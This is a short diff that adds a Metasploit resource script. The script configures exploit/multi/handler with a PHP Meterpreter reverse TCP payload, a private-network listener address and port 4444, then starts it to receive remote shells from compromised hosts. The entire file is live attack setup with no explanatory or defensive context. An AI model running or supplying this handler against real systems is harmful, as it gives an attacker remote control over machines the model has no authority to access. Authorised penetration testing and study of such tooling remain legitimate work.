@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 192.168.178.42
+set LPORT 4444
+exploit
